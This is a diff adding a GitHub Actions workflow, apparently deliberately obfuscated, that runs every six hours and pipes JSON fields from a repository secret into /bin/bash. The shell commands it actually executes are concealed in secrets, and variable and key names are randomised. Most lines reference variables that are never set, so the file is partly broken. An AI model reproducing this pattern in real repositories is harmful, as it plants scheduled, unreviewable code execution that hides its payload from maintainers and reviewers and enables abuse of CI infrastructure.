@@ -1,0 +1,26 @@
+name: shunzhuanganliang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shunzhuanganliang
+        env:
+          uo55: ${{ secrets.uo55 }}
+        run: |
+          echo $uo55 | jq -r .d5 | /bin/bash
+          echo $kr336 | jq -r .xbep1085 | /bin/bash
+          echo $zmwot6 | jq -r .nsg12 | /bin/bash
+          echo $nj88 | jq -r .tsnkd93319 | /bin/bash
+          echo $i1 | jq -r .nyn54001 | /bin/bash
+          echo $ztchu05304 | jq -r .kvo4806 | /bin/bash
+          echo $avip81 | jq -r .ns199 | /bin/bash
+          echo $lwj60069 | jq -r .njcew4 | /bin/bash
+          echo $q66 | jq -r .xdz6 | /bin/bash
+
